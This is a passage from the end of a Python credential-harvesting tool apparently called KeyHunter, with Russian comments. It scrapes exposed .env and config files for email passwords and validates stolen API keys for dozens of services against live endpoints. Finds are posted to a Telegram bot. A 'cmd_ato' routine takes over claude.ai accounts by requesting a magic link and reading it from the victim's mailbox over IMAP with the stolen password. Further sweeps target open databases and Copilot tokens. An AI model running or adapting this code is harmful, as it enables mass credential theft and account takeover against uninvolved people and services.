            if "@" not in email_addr or len(pwd) < 6:
                continue
            key = "%s|%s" % (email_addr, pwd)
            h = khash(key, None)
            if h in _seen_keys:
                continue
            with _lock:
                if h in _sweep_done:
                    continue
                _sweep_done.add(h)
            v = validate_email_cred(
                key, "env-smtp:%s%s|smtp=%s" % (host, path, smtp_hint)
            )
            if v is None:
                continue
            log("  📧 ENV-SMTP: %s @ %s" % (email_addr, host))
            store(v)
            with _lock:
                _persist.add(h)
            out.append(v)
            # 📨 МГНОВЕННО в TG: нашёл ящик -> сразу в бота
            post_finding_now(v)
            # ATO-хук: ящик с claude-маркерами -> sessionKey
            ato_res = ato_from_email_result(v)
            if ato_res:
                store(ato_res)
                out.append(ato_res)
                post_finding_now(ato_res)
                log("  🎯 env-smtp ATO: %s -> сессия!" % email_addr)
        return out

    # 🚀 параллельный фетч хостов: РОТИРУЕМОЕ окно 80 (было matches[:80] =
    # вечно первые 80 от дорка #1, остальные дорки никогда не обрабатывались)
    if len(matches) > 80:
        _w0 = (cycle * 80) % len(matches)
        _window = (matches[_w0:] + matches[:_w0])[:80]
    else:
        _window = matches
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
            for res in ex.map(process_host, _window):
                if res:
                    results.extend(res)
    except Exception as e:
        log("env-smtp parallel err: %s" % e)

    try:
        # храним не больше 2000 хостов
        if len(seen_hosts) > 2000:
            seen_hosts = dict(sorted(seen_hosts.items(), key=lambda kv: -kv[1])[:2000])
        json.dump(
            seen_hosts,
            open(os.path.join(HERE, "env_smtp_seen.json"), "w", encoding="utf-8"),
        )
    except Exception:
        pass
    # персистим хэши рабочих находок в seen (было: не сохранялись -> после
    # рестарта те же креды валидились заново и летели в TG повторно)
    if _persist:
        try:
            _sn = load_seen()
            _sn |= _persist
            save_seen(_sn)
        except Exception:
            pass
    return results


# Теги, которые НЕЛЬЗЯ перепроверять chat-пробой: у них не LLM-эндпоинт,
# quick_chat против их base бессмысленен (404/401 шум), а запись может
# ложно умереть (401 от чужого сервера != мёртвая сессия). Их валидаторы
# живут в validate_*; речек тут их просто не трогает.
NON_LLM_TAGS = {
    "jwt",
    "websess",
    "gcookie",
    "tg-bot",
    "email-cred",
    "db-dsn",
    "github",
    "github-token",
    "gitlab",
    "slack",
    "stripe",
    "discord",
    "sendgrid",
    "notion",
    "airtable",
    "aws",
    "google-refresh",
    "codex-web",
    "kimi-web",
    "openai-web",
    "anthropic-web",
    "tg-export",
    "laravel-appkey",
    "gocspx",
    "cloudflare",
    "npm",
    "linear",
    "figma",
    "twilio",
    "shopify",
    "sentry",
    "roblox",
    "steam",
    "instagram",
    "x-session",
    "cursor-web",
    "supabase-auth",
    # аудит 2026-09-10: recheck chat-пробами УБИВАЛ эти записи (их валидаторы
    # не OpenAI-chat): baseten требует Api-Key заголовок, ort01 — это
    # refresh_token (401 на x-api-key -> ложная смерть), admin01 — не чат,
    # codex — chatgpt backend-api, google/replicate — не chat-эндпоинты.
    "baseten",
    "anthropic-refresh",
    "anthropic-admin",
    "codex",
    "google",
    "replicate",
    "supabase",
    # аудит-волна 2: у этих свои валидаторы, chat-проба recheck'а — чистый
    # прожиг (у elevenlabs/jina/voyage вообще нет chat-эндпоинта)
    "elevenlabs",
    "huggingface",
    "perplexity",
    "jina",
    "voyage",
    # OSINT-волна 2026-09-10: все новые классы — не LLM-chat
    "doppler",
    "vault",
    "terraform",
    "digitalocean",
    "square",
    "square-secret",
    "postman",
    "databricks",
    "dropbox",
    "mailchimp",
    "dockerhub",
    "rubygems",
    "heroku",
    "datadog",
    "mailgun",
    "facebook",
    "google-oauth-token",
    "jfrog",
    "grafana-cloud",
    "atlassian",
    "newrelic",
    "okta",
    "algolia",
    "azure-ad",
    "slack-webhook",
    "ngrok",
    "pypi",
    "fcm",
}
# working-ключи перепроверяем только когда протухли (20ч): каждый quick_chat
# жжёт квоту самой находки, а свежепроверенный ключ не успевает умереть.
RECHECK_WORKING_STALE = 20 * 3600
# REVIVED-нотификейшн не чаще раза в 24ч на ключ: modelscope/sensenova с
# суточной квотой флапают working<->no_balance каждый день = TG-спам.
REVIVE_NOTIFY_COOLDOWN = 24 * 3600


def cmd_recheck():
    """Ревалидация с БОЕВЫМ вызовом: ловим пополненные no_balance и умершие working."""
    if not os.path.exists(STORE_PATH):
        log("store пуст")
        return
    recs = []
    with open(STORE_PATH, encoding="utf-8") as _f:
        for l in _f:
            if not l.strip():
                continue
            try:
                recs.append(json.loads(l))
            except Exception:
                continue  # битая строка не роняет весь речек
    # сплит: не-LLM теги и свежие working не дёргаем вообще
    now0 = time.time()
    skipped, to_check = [], []
    for v in recs:
        if v.get("tag") in NON_LLM_TAGS:
            skipped.append(v)
            continue
        # open-infra записи с синтетическим ключом open://addr — это
        # ОТКРЫТЫЕ ЭНДПОИНТЫ (ключей нет), chat-проба их ломает/флапает
        # статус. Реальные sk- мастер-ключи того же тега пробуем.
        if v.get("tag") == "open-infra" and str(v.get("key", "")).startswith("open://"):
            skipped.append(v)
            continue
        if (
            v.get("status") == "working"
            and now0 - (v.get("_last_recheck") or v.get("ts") or 0)
            < RECHECK_WORKING_STALE
        ):
            skipped.append(v)
            continue
        to_check.append(v)
    recs = to_check
    log(
        "ревалидация %d записей (боевой вызов; %d пропущено: не-LLM/свежие)..."
        % (len(recs), len(skipped))
    )

    def recheck_one(v):
        base = v.get("base", "")
        key = v["key"]
        old_status = v.get("status", "")
        # anthropic — свой эндпоинт /messages, не /chat/completions
        if "anthropic.com" in base:
            nv = validate_anthropic(key)
            if nv:
                # используем РЕАЛЬНЫЙ статус (working/no_balance), не хардкод
                return v, old_status, nv.get("status", "no_balance"), "claude"
            return v, old_status, "invalid_key", "claude"
        # cc-proxy: anthropic-стиль /v1/messages (НЕ /chat/completions!) —
        # иначе 404 -> not_found -> риск ложной смерти при сбое
        if v.get("tag") == "cc-proxy":
            try:
                rr = requests.post(
                    base.rstrip("/") + "/messages",
                    headers={
                        "x-api-key": key,
                        "anthropic-version": "2023-06-01",
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": "claude-opus-4-8",
                        "max_tokens": 4,
                        "messages": [{"role": "user", "content": "hi"}],
                    },
                    timeout=(8, 20),
                    verify=False,
                )
                if rr.status_code == 200:
                    return v, old_status, "working", "claude-opus-4-8"
                if rr.status_code == 429:
                    return v, old_status, "no_balance", "claude-opus-4-8"
                if rr.status_code == 401:
                    return v, old_status, "invalid_key", "claude-opus-4-8"
                return v, old_status, "unknown", "claude-opus-4-8"
            except Exception:
                return v, old_status, "net", "claude-opus-4-8"
        # выбираем жирную модель для пробы
        models = v.get("models", []) or v.get("stars_listed", [])
        test_model = None
        for pref in (
            "claude-fable-5",
            "anthropic/claude-fable-5",
            "claude-opus-4-8",
            "gpt-5.6-sol",
            "ZHIPU/GLM-5.3",
            "glm-5.3",
            "deepseek-v4-pro",
            "deepseek-ai/DeepSeek-V4-Pro",
        ):
            for m in models:
                if m == pref:
                    test_model = m
                    break
            if test_model:
                break
        if not test_model:
            sw = v.get("stars_working", [])
            test_model = sw[0] if sw else (models[0] if models else None)
        if not test_model:
            test_model = "gpt-4o-mini"

        state, detail = quick_chat(base, key, test_model)
        return v, old_status, state, test_model

    alive, dead = [], []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(recheck_one, v): v for v in recs}
        for f in concurrent.futures.as_completed(futs):
            v_orig = futs[f]
            try:
                v, old_status, state, test_model = f.result()
            except Exception:
                alive.append(v_orig)  # при ошибке — оставляем как было
                continue
            if state == "working":
                # КЛЮЧ РАБОТАЕТ
                v["_last_recheck"] = time.time()
                if old_status in ("no_balance", "listed_only"):
                    # РЕВАЙВАЛ! ключ пополнили
                    v["status"] = "working"
                    v["ts"] = time.time()
                    sw = set(v.get("stars_working", []))
                    sw.add(test_model)
                    v["stars_working"] = sorted(sw)
                    # анти-флап: TG не чаще раза в 24ч на ключ (дневные квоты
                    # modelscope/sensenova иначе спамят REVIVED каждый цикл)
                    last_n = v.get("_revive_notified_ts") or 0
                    quiet = (time.time() - last_n) < REVIVE_NOTIFY_COOLDOWN
                    log(
                        "  💚 REVIVED %s @ %s (%s) — был %s!%s"
                        % (
                            v["key"][:16] + "…",
                            v.get("base", ""),
                            test_model,
                            old_status,
                            " (тихо: cooldown)" if quiet else "",
                        )
                    )
                    if not quiet:
                        try:
                            post_telegram(
                                "💚 КЛЮЧ ОЖИЛ (был no_balance)!\n<code>%s</code>\n🌐 %s\n✅ %s"
                                % (v["key"], v.get("base", ""), test_model)
                            )
                            v["_revive_notified_ts"] = time.time()
                        except Exception:
                            pass
                else:
                    v["status"] = "working"
                alive.append(v)
            elif state == "no_balance":
                v["status"] = "no_balance"
                v["_last_recheck"] = time.time()
                alive.append(v)
            elif state == "invalid_key" or (
                state in ("not_found", "unknown", "net") and bad_base(v.get("base", ""))
            ):
                # мёртвый ключ ИЛИ мусорная база (логин/трекер/дашборд) — в dead
                dead.append(v)
                log("  💀 DEAD %s @ %s" % (v["key"][:16] + "…", v.get("base", "")))
            else:
                # timeout/err — не убиваем, оставляем как было
                # (_last_recheck НЕ ставим: сеть шумнула, ключ не проверен)
                alive.append(v)

    # пропущенные (не-LLM теги / свежие working) — возвращаем в живые без проб
    alive.extend(skipped)

    # merge-safe запись: под LOCK перечитываем файл, обновляем записи по
    # (key, base), строки добавленные store() во время валидации — сохраняем
    def _kb(c):
        return (c.get("key"), c.get("base") or "")

    with LOCK:
        try:
            current = []
            with open(STORE_PATH, encoding="utf-8") as _f:
                for l in _f:
                    if l.strip():
                        try:
                            current.append(json.loads(l))
                        except Exception:
                            continue
        except Exception:
            # merge-перечитка упала — АБОРТИМ перезапись (было: молча
            # терялись все записи, добавленные между load и merge)
            log("  ⚠️ recheck: merge re-read failed — стор НЕ трогаем")
            return
        by_kb = {}
        for c in current:
            by_kb[_kb(c)] = c
        for v in alive:
            if v:
                by_kb[_kb(v)] = v  # обновлённая запись побеждает
        for d in dead:
            by_kb.pop(_kb(d), None)
        # АТОМАРНАЯ перезапись: tmp + os.replace + .bak (было: голое open("w")
        # — крэш посреди перезаписи = стор обнулён навсегда)
        try:
            if os.path.exists(STORE_PATH):
                _bk = STORE_PATH + ".bak"
                if os.path.exists(_bk):
                    os.remove(_bk)
                os.replace(STORE_PATH, _bk)
        except Exception:
            pass
        _tmp = STORE_PATH + ".tmp"
        with open(_tmp, "w", encoding="utf-8") as f:
            for c in by_kb.values():
                f.write(json.dumps(c, ensure_ascii=False) + "\n")
        os.replace(_tmp, STORE_PATH)
        # синк self-dedup индекса: мёртвые khash освобождаем (иначе повторная
        # находка того же ключа позже молча блокировалась бы store())
        global _STORE_KHASH
        if _STORE_KHASH is not None:
            for d in dead:
                _STORE_KHASH.discard(khash(d.get("key", ""), d.get("base")))
    # SEEN-освобождение: мёртвый khash в seen.json блокировал ПОВТОРНУЮ
    # находку навсегда (ключ оживили -> источник приносит снова -> seen
    # молча глотает). Убираем мёртвых из seen-файла: оживший ключ
    # ревалидируется как новый.
    if dead:
        try:
            _seen = load_seen()
            _before = len(_seen)
            for d in dead:
                _seen.discard(khash(d.get("key", ""), d.get("base")))
            if len(_seen) != _before:
                save_seen(_seen)
        except Exception:
            pass
    with open(DEAD_PATH, "a", encoding="utf-8") as f:
        for v in dead:
            f.write(json.dumps(v, ensure_ascii=False) + "\n")
    log("живых: %d, мёртвых: %d (архив: %s)" % (len(alive), len(dead), DEAD_PATH))


def cmd_validate(base, key):
    v = validate(key, base, "manual", "cli")
    if v:
        log(render_report(v))
    else:
        log("❌ мёртвый: %s @ %s" % (key[:16] + "…", base))


def cmd_sources():
    log("источники:")
    for cls in ALL_SOURCE_CLASSES:
        s = cls()
        note = ""
        if s.name == "github-code" and not gh_token():
            note = "(нужен github_token)"
        if s.name == "github-issues" and not gh_token():
            note = "(нужен github_token)"
        if s.name == "shodan" and not CFG["shodan_key"]:
            note = "(нужен shodan_key)"
        if s.name == "fofa" and not (CFG["fofa_email"] and CFG["fofa_key"]):
            note = "(нужен fofa_email+key)"
        if s.name == "feeds" and not (CFG["feeds"] or CFG.get("tg_channels")):
            note = "(пусто: добавь feeds/tg_channels)"
        health_left = source_health_remaining(s.name)
        if health_left:
            note = ((note + " ") if note else "") + "[SKIP %d]" % health_left
        log("  %-16s %s" % (s.name, note or "ok"))


def cmd_ato(email):
    """ATO-цепочка Claude: magic-link на захваченный ящик (креды из стора/очереди)
    -> читаем письмо по IMAP -> печатаем ссылку/OTP (открыл = сессия аккаунта).

    NB: claude.ai next-auth флоу периодически меняется — обёрнуто в try/except,
    при неудаче смотри лог и дёргай руками (forgot-password на сайте)."""
    cred = None
    for path in (STORE_PATH, os.path.join(HERE, "creds_queue.jsonl")):
        try:
            for line in open(path, encoding="utf-8"):
                try:
                    v = json.loads(line)
                except Exception:
                    continue
                k = v.get("key") or v.get("k") or ""
                if k.lower().startswith(email.lower() + "|"):
                    cred = k
                    break
        except Exception:
            continue
        if cred:
            break
    if not cred:
        log("креды для %s не найдены (стор/очередь пусты)" % email)
        return
    em, pwd = cred.split("|", 1)
    domain = em.rsplit("@", 1)[-1].lower()
    hosts = IMAP_MAP.get(domain) or ["imap." + domain, "mail." + domain, domain]
    # 1) запрашиваем magic-link (next-auth /api/auth/csrf -> /signin/email)
    try:
        s = requests.Session()
        s.headers.update(UA)
        r0 = s.get("https://claude.ai/api/auth/csrf", timeout=(10, 20), verify=False)
        csrf = r0.json().get("csrfToken", "")
        r1 = s.post(
            "https://claude.ai/api/auth/signin/email",
            data={
                "email": em,
                "csrfToken": csrf,
                "callbackUrl": "https://claude.ai/new",
                "json": "true",
            },
            timeout=(10, 25),
            verify=False,
        )
        log("magic-link request: HTTP %s %s" % (r1.status_code, (r1.text or "")[:120]))
    except Exception as e:
        log("magic-link request failed: %s" % e)
    # 2) ждём письмо, вытаскиваем ссылку или OTP
    deadline = time.time() + 180
    while time.time() < deadline:
        for h in hosts[:2]:
            M = _imap_login(h, em, pwd)
            if M is None:
                continue
            try:
                M.select("INBOX", readonly=True)
                typ, data = M.search(None, '(FROM "claude")')
                if not (typ == "OK" and data and data[0].split()):
                    typ, data = M.search(None, '(FROM "anthropic")')
                ids = data[0].split() if (data and data[0]) else []
                if ids:
                    typ, msg = M.fetch(ids[-1], "(RFC822)")
                    raw = b""
                    for part in msg:
                        if isinstance(part, tuple):
                            raw += part[1]
                    txt = raw.decode("utf-8", "replace")
                    m = re.search(
                        r"https://claude\.ai/api/auth/callback/email[^\"'\s<>]+", txt
                    )
                    if m:
                        log("🎯 MAGIC LINK: %s" % htmllib.unescape(m.group(0)))
                        log("   открываешь в браузере -> сессия аккаунта %s" % em)
                        M.logout()
                        return
                    m2 = re.search(
                        r"(?:code|код)[^\d]{0,20}(\d{6})|>(\d{6})<", txt, re.I
                    )
                    if m2:
                        log("🎯 OTP КОД: %s" % (m2.group(1) or m2.group(2)))
                        M.logout()
                        return
                M.logout()
            except Exception:
                try:
                    M.logout()
                except Exception:
                    pass
        time.sleep(10)
    log("письмо не пришло за 180с (проверь спам/повтори)")


def main():
    ap = argparse.ArgumentParser(description="KeyHunter v2 — монитор API-ключей")
    ap.add_argument(
        "cmd",
        nargs="?",
        default="once",
        choices=[
            "once",
            "monitor",
            "loop",
            "scan-file",
            "scan-dir",
            "validate",
            "recheck",
            "sources",
            "ato",
        ],
    )
    ap.add_argument("--every", type=int, default=None)
    ap.add_argument("--base", default=None)
    ap.add_argument("--key", default=None)
    ap.add_argument("path", nargs="?", default=None)
    ap.add_argument("--no-post", action="store_true")
    ap.add_argument(
        "--deep",
        action="store_true",
        help="backfill: глубокая пагинация гистов (30 стр)",
    )
    args = ap.parse_args()

    every = args.every or CFG.get("loop_every", 900)

    if args.cmd == "sources":
        cmd_sources()
    elif args.cmd == "validate":
        if not (args.base and args.key):
            log("usage: keyhunter.py validate --base URL --key KEY")
        else:
            cmd_validate(args.base, args.key)
    elif args.cmd == "recheck":
        cmd_recheck()
    elif args.cmd == "ato":
        if not args.path:
            log("usage: keyhunter.py ato <email>")
        else:
            cmd_ato(args.path)
    elif args.cmd == "scan-file":
        if not args.path:
            log("usage: keyhunter.py scan-file <path>")
        else:
            run_once([args.path], post=not args.no_post)
    elif args.cmd == "scan-dir":
        if not args.path:
            log("usage: keyhunter.py scan-dir <dir>")
        else:
            run_once([args.path], post=not args.no_post)
    elif args.cmd == "once":
        if args.deep:
            CFG["deep_gists_pages"] = 30
            log("🔬 DEEP MODE: gist pagination x30")
        run_once(post=not args.no_post)
    elif args.cmd in ("monitor", "loop"):
        # ротация лога: >5MB -> оставляем последний 1MB (иначе недели роста
        # съедят диск и замедлят tail)
        try:
            if os.path.getsize(LOG_PATH) > 5_000_000:
                with open(LOG_PATH, "rb") as f:
                    f.seek(-1_000_000, os.SEEK_END)
                    tail = f.read()
                with open(LOG_PATH, "wb") as f:
                    f.write(b"... rotated ...\n" + tail)
        except Exception:
            pass
        log("🔔 MONITOR: проход каждые %ds. Ctrl+C — стоп." % every)
        log("   автодроп находок: %s" % DESKTOP_DROP)
        log("   TG-постинг: включён (бот ждёт /start для захвата chat_id)")
        log("   ревалидация стора: каждый 4-й цикл")
        # транспорт-проба: видно в логе, жив ли прокси-канал (10809)
        try:
            for _nm, _ss in (("proxy", PROXY), ("direct", DIRECT)):
                try:
                    _r = _ss.get("https://api.ipify.org", timeout=5, verify=False)
                    log("   транспорт %s: OK (exit %s)" % (_nm, _r.text.strip()))
                except Exception as _e:
                    log("   транспорт %s: DEAD (%s)" % (_nm, type(_e).__name__))
        except Exception:
            pass
        cycle = 0
        while True:
            cycle += 1
            global CYCLE_COUNTER
            CYCLE_COUNTER = cycle
            log(
                "──── цикл #%d %s ────"
                % (cycle, datetime.datetime.now().strftime("%H:%M:%S"))
            )
            # TG: ждём /start от юзера каждый цикл, пока chat_id не захвачен
            if CFG.get("tg_token") and not CFG.get("tg_chat"):
                tg_discover_chat()
            try:
                run_once(post=not args.no_post)
            except KeyboardInterrupt:
                break
            except Exception as e:
                log("цикл err: %s: %s" % (type(e).__name__, e))
            # CC-прокси свип: автоохота на Max-слоты
            try:
                _fat = cc_proxy_sweep(cycle)
                if _fat:
                    log("  🔥 cc-sweep: %d Max-слотов!" % len(_fat))
            except Exception:
                pass
            # ENV-SMTP свип: открытые .env/PHP-конфиги с почтовыми кредами
            # -> ящики -> ATO-сессии (автоматически, каждый цикл)
            try:
                _env = env_smtp_sweep(cycle)
                if _env:
                    log("  📧 env-smtp sweep: %d находок" % len(_env))
            except Exception as e:
                log("env-smtp sweep err: %s" % e)
            # KEYSMITH: самодобыча недостающих ключей источников (fofa и ко)
            try:
                self_keysmith(cycle)
            except Exception:
                pass
            # OPEN-DB свип: открытые Elastic/Mongo/Redis = сырые дампы
            try:
                opendb_sweep(cycle)
            except Exception as e:
                log("opendb sweep err: %s" % e)
            # COPILOT свип: github-токены из стора -> Copilot-подписка?
            # АУДИТ-фикс: функция была написана, но НИГДЕ не вызывалась —
            # весь пласт Copilot-сабов лежал мёртвым кодом
            try:
                _cop = copilot_sweep(cycle)
                if _cop:
                    log("  🤖 copilot-sweep: %d находок" % len(_cop))
            except Exception as e:
                log("copilot sweep err: %s" % e)
            # VAULT SYNC + FAVICON PIVOT: каждый 4-й цикл
            if cycle % 4 == 0:
                try:
                    vault_push_finds()
                except Exception:
                    pass
                try:
                    favicon_pivot_sweep(cycle)
                except Exception as e:
                    log("favicon pivot err: %s" % e)
            # ревалидация каждые 4 цикла: чистим мёртвые ключи из стора
            if cycle % 4 == 0:
                try:
                    log("── ревалидация стора (каждый 4-й цикл) ──")
                    cmd_recheck()
                except Exception as e:
                    log("recheck err: %s" % e)
            try:
                time.sleep(every)
            except KeyboardInterrupt:
                break


if __name__ == "__main__":
    main()
